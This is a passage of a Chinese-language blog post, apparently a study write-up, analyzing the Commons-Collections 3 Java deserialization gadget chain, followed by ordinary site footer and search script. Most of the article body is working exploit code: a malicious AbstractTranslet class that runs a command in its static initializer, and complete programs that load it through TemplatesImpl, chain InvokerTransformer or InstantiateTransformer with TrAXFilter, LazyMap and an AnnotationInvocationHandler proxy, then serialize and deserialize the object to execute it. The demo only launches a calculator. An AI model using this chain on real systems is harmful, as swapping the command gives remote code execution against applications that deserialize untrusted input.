+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640076504953-c64fcccb-5f7a-44ca-88d3-015de88e1760.png" alt="img" /></p>
+
+<p>因此，我们需要满足表达式 superClass.getName().equals(ABSTRACT_TRANSLET 成立，进而 _transletIndex 赋值为 0 ，才可以在下面这里不抛出。</p>
+
+<p>ABSTRACT_TRANSLET 的值为 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet，所以我们编写的恶意类需要继承自这一个类。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640077217556-0b003fef-9f10-48ac-b80a-9ad0cb0a5c48.png" alt="img" /></p>
+
+<p>修改 Calc.java，注意需要实现两个 transform 方法。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Calc2</span> <span class="kd">extends</span> <span class="nc">AbstractTranslet</span><span class="o">{</span>
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"calc"</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="no">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="nc">SerializationHandler</span><span class="o">[]</span> <span class="n">handlers</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">TransletException</span> <span class="o">{</span>
+
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="no">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="nc">DTMAxisIterator</span> <span class="n">iterator</span><span class="o">,</span> <span class="nc">SerializationHandler</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">TransletException</span> <span class="o">{</span>
+
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>再次运行时可以正常弹出计算器。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640077344524-73952bce-0e60-44ea-a94f-2c095660a157.png" alt="img" /></p>
+
+<p>结合之前的 CC1 编写 exp：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">TestCC3</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">Path</span> <span class="n">path</span> <span class="o">=</span> <span class="nc">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"C:\\tmp\\Calc2.class"</span><span class="o">);</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="nc">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
+        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">bytes1</span> <span class="o">=</span> <span class="o">{</span><span class="n">bytes</span><span class="o">};</span>
+        <span class="nc">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TemplatesImpl</span><span class="o">();</span>
+        <span class="nc">Field</span> <span class="n">bytecodesField</span> <span class="o">=</span> <span class="nc">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_bytecodes"</span><span class="o">);</span>
+        <span class="n">bytecodesField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">bytecodesField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="n">bytes1</span><span class="o">);</span>
+
+        <span class="nc">Field</span> <span class="n">nameField</span> <span class="o">=</span> <span class="nc">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_name"</span><span class="o">);</span>
+        <span class="n">nameField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">nameField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>
+
+        <span class="nc">Field</span> <span class="n">classField</span> <span class="o">=</span> <span class="nc">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_class"</span><span class="o">);</span>
+        <span class="n">classField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">classField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
+
+        <span class="nc">Field</span> <span class="n">tfactoryField</span> <span class="o">=</span> <span class="nc">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_tfactory"</span><span class="o">);</span>
+        <span class="n">tfactoryField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">tfactoryField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="k">new</span> <span class="nc">TransformerFactoryImpl</span><span class="o">());</span>
+
+<span class="c1">//        templates.newTransformer();</span>
+        <span class="nc">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ChainedTransformer</span><span class="o">(</span>
+                <span class="k">new</span> <span class="nc">Transformer</span><span class="o">[]{</span>
+                        <span class="k">new</span> <span class="nf">ConstantTransformer</span><span class="o">(</span>
+                                <span class="n">templates</span>
+                        <span class="o">),</span>
+                        <span class="k">new</span> <span class="nf">InvokerTransformer</span><span class="o">(</span>
+                                <span class="s">"newTransformer"</span><span class="o">,</span>
+                                <span class="kc">null</span><span class="o">,</span>
+                                <span class="kc">null</span>
+                        <span class="o">),</span>
+                <span class="o">});</span>
+        <span class="n">chainedTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="k">new</span> <span class="nc">Object</span><span class="o">());</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+
+<p>使用 InvokerTransformer 来构造，剩下的和 CC1 一致，使用 AnnotationInvocationHandler 的 readObject 就可以了。</p>
+
+<h3 id="2-instantiatetransformer-调用链">2. InstantiateTransformer 调用链</h3>
+
+<p>ysoserial 中使用的并不是 InvokerTransformer，而是 InstantiateTransformer。下面进一步分析 ysoserial 中的这一条利用链。</p>
+
+<p>使用 find Usages 查找 newTransformer。可以发现在下面三个类中有调用，ysoserial 使用的是 TrAXFilter。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640078273549-a1385780-62d7-4dda-bbad-456f68a14044.png" alt="img" /></p>
+
+<p>可以看到调用 newTransformer 是 TrAXFilter 的构造器。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640078321883-bcbad6f4-aa4c-4246-a7ed-ba784f7d0809.png" alt="img" /></p>
+
+<p>但实际上 TrAXFilter 类没有继承 Serializable 接口，不能序列化。但是在 InstantiateTransformer.transform 方法，获取传入参数的构造器，并且进行了实例化。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640078451046-7541b1e6-9962-44bf-9caa-e1119c0328e5.png" alt="img" /></p>
+
+<p>因此我们可以将 iParamTypes 赋值为 TrAXFilter 实例，在实例化时就可以调用 TrAXFilter 的构造器。</p>
+
+<p>利用链如下：</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640078574708-d909c6e2-aeed-4199-8c92-6bf7227959e7.png" alt="img" /></p>
+
+<p>编写对应的 exp：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InstantiateTransformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.xml.transform.Templates</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.annotation.Target</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Proxy</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Path</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC3</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">TestCC3</span><span class="o">();</span>
+<span class="c1">//        unserialize("abc.ser.bin");</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">TestCC3</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">Path</span> <span class="n">path</span> <span class="o">=</span> <span class="nc">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"C:\\tmp\\Calc2.class"</span><span class="o">);</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="nc">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
+        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">bytes1</span> <span class="o">=</span> <span class="o">{</span><span class="n">bytes</span><span class="o">};</span>
+        <span class="nc">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TemplatesImpl</span><span class="o">();</span>
+        <span class="nc">Field</span> <span class="n">bytecodesField</span> <span class="o">=</span> <span class="nc">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_bytecodes"</span><span class="o">);</span>
+        <span class="n">bytecodesField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">bytecodesField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="n">bytes1</span><span class="o">);</span>
+
+        <span class="nc">Field</span> <span class="n">nameField</span> <span class="o">=</span> <span class="nc">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_name"</span><span class="o">);</span>
+        <span class="n">nameField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">nameField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>
+
+        <span class="nc">Field</span> <span class="n">classField</span> <span class="o">=</span> <span class="nc">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_class"</span><span class="o">);</span>
+        <span class="n">classField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">classField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
+
+        <span class="nc">Field</span> <span class="n">tfactoryField</span> <span class="o">=</span> <span class="nc">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_tfactory"</span><span class="o">);</span>
+        <span class="n">tfactoryField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">tfactoryField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="k">new</span> <span class="nc">TransformerFactoryImpl</span><span class="o">());</span>
+
+        <span class="nc">InstantiateTransformer</span> <span class="n">instantiateTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">InstantiateTransformer</span><span class="o">(</span><span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="n">templates</span><span class="o">});</span>
+
+<span class="c1">//        instantiateTransformer.transform(TrAXFilter.class);</span>
+        <span class="nc">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ChainedTransformer</span><span class="o">(</span>
+                <span class="k">new</span> <span class="nc">Transformer</span><span class="o">[]{</span>
+                        <span class="k">new</span> <span class="nf">ConstantTransformer</span><span class="o">(</span>
+                                <span class="nc">TrAXFilter</span><span class="o">.</span><span class="na">class</span>
+                        <span class="o">),</span>
+                        <span class="n">instantiateTransformer</span><span class="o">,</span>
+                <span class="o">});</span>
+<span class="c1">//        chainedTransformer.transform(new Object());</span>
+
+        <span class="nc">HashMap</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">&lt;&gt;();</span>
+        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"entrySet1"</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>
+
+        <span class="nc">LazyMap</span> <span class="n">lazyMap</span> <span class="o">=</span> <span class="o">(</span><span class="nc">LazyMap</span><span class="o">)</span> <span class="nc">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>
+
+        <span class="nc">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
+        <span class="nc">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="nc">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="nc">InvocationHandler</span> <span class="n">h1</span> <span class="o">=</span> <span class="o">(</span><span class="nc">InvocationHandler</span><span class="o">)</span> <span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="nc">Target</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">lazyMap</span><span class="o">);</span>
+
+        <span class="nc">Map</span> <span class="n">proxymap</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Map</span><span class="o">)</span> <span class="nc">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="nc">LazyMap</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span> <span class="nc">LazyMap</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getInterfaces</span><span class="o">(),</span> <span class="n">h1</span><span class="o">);</span>
+
+        <span class="nc">InvocationHandler</span> <span class="n">h2</span> <span class="o">=</span> <span class="o">(</span><span class="nc">InvocationHandler</span><span class="o">)</span> <span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="nc">Target</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">proxymap</span><span class="o">);</span>
+        <span class="n">serialize</span><span class="o">(</span><span class="n">h2</span><span class="o">);</span>
+        <span class="n">unserialize</span><span class="o">(</span><span class="s">"abc.ser.bin"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">serialize</span><span class="o">(</span><span class="nc">Object</span> <span class="n">o</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileOutputStream</span><span class="o">(</span><span class="s">"abc.ser.bin"</span><span class="o">));</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">unserialize</span><span class="o">(</span><span class="nc">String</span> <span class="n">filePath</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">ObjectInputStream</span> <span class="n">ins</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileInputStream</span><span class="o">(</span><span class="n">filePath</span><span class="o">));</span>
+        <span class="n">ins</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+</code></pre></div></div>
+
+<p>可以弹出计算器。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640078899081-b4baec9c-d6ab-4de0-9a32-ad6c311d10d4.png" alt="img" /></p>
+
+<p>其他的也与 CC1 一样，利用 AnnotationInvocationHandler 的 readObject 就可以了。</p>
+
+<p>最终利用链长这样：</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640079138538-e2bf1e1a-fa18-4af3-9703-c06241340f95.png" alt="img" /></p>
+
+<h1 id="参考文章">参考文章</h1>
+
+<ul>
+  <li><a href="https://www.bilibili.com/video/BV1Zf4y1F74K?spm_id_from=333.999.0.0">Java反序列化CommonsCollections篇(三)</a></li>
+  <li><a href="https://www.bilibili.com/video/BV16h411z7o9?p=4">Java反序列化漏洞专题-基础篇(21/09/05更新类加载部分)</a></li>
+  <li><a href="http://wjlshare.com/archives/1535">Commons-Collections 1-7 利用链分析</a></li>
+  <li>
+    <p><a href="https://segmentfault.com/a/1190000023876273">Java类加载机制和对象创建过程</a></p>
+  </li>
+  <li><a href="https://juejin.cn/post/6844903838927814669">面试官：说说双亲委派模型？</a></li>
+  <li><a href="https://www.cnblogs.com/Qian123/p/5713440.html">Java提高篇——静态代码块、构造代码块、构造函数以及Java类初始化顺序</a></li>
+</ul>
+</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2021-12-22T03:31:38+08:00"><!-- start custom article footer snippet -->
+
+<!-- end custom article footer snippet -->
+<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
+</div><div class="article__license"><div class="license">
+    <p>This work is licensed under a <a itemprop="license" rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">Attribution-NonCommercial 4.0 International</a> license.
+      <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">
+        <img alt="Attribution-NonCommercial 4.0 International" src="https://i.creativecommons.org/l/by-nc/4.0/88x31.png" />
+      </a>
+    </p>
+  </div></div></footer>
+<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/java/2021/12/18/CommonsCollections6.html">CommonsCollections6</a></div><div class="next"><span>NEXT</span><a href="/java/2021/12/23/CommonsCollections2.html">CommonsCollections2</a></div></div></div>
+
+</div>
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    $(function() {
+      var $this ,$scroll;
+      var $articleContent = $('.js-article-content');
+      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
+      $scroll = $(scroll);
+
+      $articleContent.find('.highlight').each(function() {
+        $this = $(this);
+        $this.attr('data-lang', $this.find('code').attr('data-lang'));
+      });
+      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
+        $this = $(this);
+        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
+      });
+      $articleContent.on('click', '.anchor', function() {
+        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
+      });
+    });
+  });
+})();
+</script>
+</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->
+
+<!-- end custom main bottom snippet -->
+</div>
+            </div></div></div><div class="page__footer d-print-none">
+<footer class="footer py-4 js-page-footer">
+  <div class="main"><div itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="DumKiy"><meta itemprop="url" content="/"><meta itemprop="description" content="Watch And Learn."><div class="footer__author-links"><div class="author-links">
+  <ul class="menu menu--nowrap menu--inline"><li title="Follow me on Github.">
+        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/DummyKitty" target="_blank">
+          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path class="svgpath" data-index="path_0" fill="#272636" d="M0 525.2c0 223.6 143.3 413.7 343 483.5 26.9 6.8 22.8-12.4 22.8-25.4l0-88.7c-155.3 18.2-161.5-84.6-172-101.7-21.1-36-70.8-45.2-56-62.3 35.4-18.2 71.4 4.6 113.1 66.3 30.2 44.7 89.1 37.2 119 29.7 6.5-26.9 20.5-50.9 39.7-69.6C248.8 728.2 181.7 630 181.7 513.2c0-56.6 18.7-108.7 55.3-150.7-23.3-69.3 2.2-128.5 5.6-137.3 66.5-6 135.5 47.6 140.9 51.8 37.8-10.2 80.9-15.6 129.1-15.6 48.5 0 91.8 5.6 129.8 15.9 12.9-9.8 77-55.8 138.8-50.2 3.3 8.8 28.2 66.7 6.3 135 37.1 42.1 56 94.6 56 151.4 0 117-67.5 215.3-228.8 243.7 26.9 26.6 43.6 63.4 43.6 104.2l0 128.8c0.9 10.3 0 20.5 17.2 20.5C878.1 942.4 1024 750.9 1024 525.3c0-282.9-229.3-512-512-512C229.1 13.2 0 242.3 0 525.2L0 525.2z" />
+</svg>
+</div>
+        </a>
+      </li></ul>
+</div>
+</div>
+    </div><div class="site-info mt-2">
+      <div>© DumKiy's blog 2021,
+        Powered by <a title="Jekyll is a simple, blog-aware, static site generator." href="http://jekyllrb.com/">Jekyll</a> & <a
+        title="TeXt is a super customizable Jekyll theme." href="https://github.com/kitian616/jekyll-TeXt-theme">TeXt Theme</a>.
+      </div>
+    </div>
+  </div>
+</footer>
+</div></div>
+    </div><script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $body = $('body'), $window = $(window);
+    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
+    var activeCount = 0;
+    function modal(options) {
+      var $root = this, visible, onChange, hideWhenWindowScroll = false;
+      var scrollTop;
+      function setOptions(options) {
+        var _options = options || {};
+        visible = _options.initialVisible === undefined ? false : show;
+        onChange = _options.onChange;
+        hideWhenWindowScroll = _options.hideWhenWindowScroll;
+      }
+      function init() {
+        setState(visible);
+      }
+      function setState(isShow) {
+        if (isShow === visible) {
+          return;
+        }
+        visible = isShow;
+        if (visible) {
+          activeCount++;
+          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
+          $root.addClass('modal--show');
+          $pageMain.scrollTop(scrollTop);
+          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
+          $window.on('keyup', handleKeyup);
+        } else {
+          activeCount > 0 && activeCount--;
+          $root.removeClass('modal--show');
+          $window.scrollTop(scrollTop);
+          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
+          $window.off('keyup', handleKeyup);
+        }
+        onChange && onChange(visible);
+      }
+      function show() {
+        setState(true);
+      }
+      function hide() {
+        setState(false);
+      }
+      function handleKeyup(e) {
+        // Char Code: 27  ESC
+        if (e.which ===  27) {
+          hide();
+        }
+      }
+      setOptions(options);
+      init();
+      return {
+        show: show,
+        hide: hide,
+        $el: $root
+      };
+    }
+    $.fn.modal = modal;
+  });
+})();
+</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal"><script>
+(function () {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    // search panel
+    var search = (window.search || (window.search = {}));
+    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
+      true : window.useDefaultSearchBox ;
+
+    var $searchModal = $('.js-page-search-modal');
+    var $searchToggle = $('.js-search-toggle');
+    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
+    var modalVisible = false;
+    search.searchModal = searchModal;
+
+    var $searchBox = null;
+    var $searchInput = null;
+    var $searchClear = null;
+
+    function getModalVisible() {
+      return modalVisible;
+    }
+    search.getModalVisible = getModalVisible;
+
+    function handleModalChange(visible) {
+      modalVisible = visible;
+      if (visible) {
+        search.onShow && search.onShow();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
+      } else {
+        search.onShow && search.onHide();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
+        setTimeout(function() {
+          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
+          search.clear && search.clear();
+          window.pageAsideAffix && window.pageAsideAffix.refresh();
+        }, 400);
+      }
+    }
+
+    $searchToggle.on('click', function() {
+      modalVisible ? searchModal.hide() : searchModal.show();
+    });
+    // Char Code: 83  S, 191 /
+    $(window).on('keyup', function(e) {
+      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
+        modalVisible || searchModal.show();
+      }
+    });
+
+    if (useDefaultSearchBox) {
+      $searchBox = $('.js-search-box');
+      $searchInput = $searchBox.children('input');
+      $searchClear = $searchBox.children('.js-icon-clear');
+      search.getSearchInput = function() {
+        return $searchInput.get(0);
+      };
+      search.getVal = function() {
+        return $searchInput.val();
+      };
+      search.setVal = function(val) {
+        $searchInput.val(val);
+      };
+
+      $searchInput.on('focus', function() {
+        $(this).addClass('focus');
+      });
+      $searchInput.on('blur', function() {
+        $(this).removeClass('focus');
+      });
+      $searchInput.on('input', window.throttle(function() {
+        var val = $(this).val();
